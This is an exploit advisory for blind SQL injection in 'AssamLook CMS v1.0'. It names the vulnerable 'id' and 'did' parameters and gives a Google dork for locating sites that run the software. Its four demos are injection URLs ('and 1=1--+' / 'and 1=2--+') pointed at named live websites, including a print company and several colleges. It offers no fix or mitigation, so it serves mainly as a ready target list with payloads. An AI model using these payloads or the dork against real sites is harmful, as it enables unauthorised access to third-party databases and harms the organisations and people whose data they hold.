## Exploit Title: AssamLook CMS - Blind SQL Injection Vulnerabilities



Vender: https://assamlook.com/

Software: AssamLook CMS v1.0

Google Dork: intext:"Powered By Assamlook.com"

Category: WebApps

Tested On: Windows, Firefox

*********************************************************

[+] Vulnerable Parameter: `id` or `did` in URLs with `.php?id=` or `.php?did=`

*********************************************************

### Demo 1:
https://rhinoprintopacks.com/product.php?id=53' and 1=1--+  
https://rhinoprintopacks.com/product.php?id=53' and 1=2--+  

### Demo 2:
https://www.nonoicollege.in/department-profile.php?did=1' and 1=1--+  
https://www.nonoicollege.in/department-profile.php?did=1' and 1=2--+  

### Demo 3:
https://rahacollege.co.in/department-profile.php?did=3' and 1=1--+  
https://rahacollege.co.in/department-profile.php?did=3' and 1=2--+  

### Demo 4:
https://www.lumdingcollege.org/view_tender.php?id=108' and 1=1--+  
https://www.lumdingcollege.org/view_tender.php?id=108' and 1=2--+  

*********************************************************

[+] Google Dork:
intext:"Powered By Assamlook.com"

*********************************************************
# Discovered by: AmirHossein Abdollahi | Mr_Amir_Typer